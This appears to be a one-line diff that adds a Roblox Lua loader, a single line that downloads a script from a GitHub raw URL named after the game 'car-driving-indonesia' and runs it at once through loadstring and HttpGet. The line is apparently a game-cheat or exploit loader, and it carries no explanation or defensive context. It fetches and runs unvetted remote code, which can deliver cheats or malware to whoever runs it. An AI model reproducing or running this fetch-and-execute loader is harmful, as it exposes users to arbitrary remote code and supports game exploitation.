@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/car-driving-indonesia-spam4-guz98688kz9tdo.lua"))()
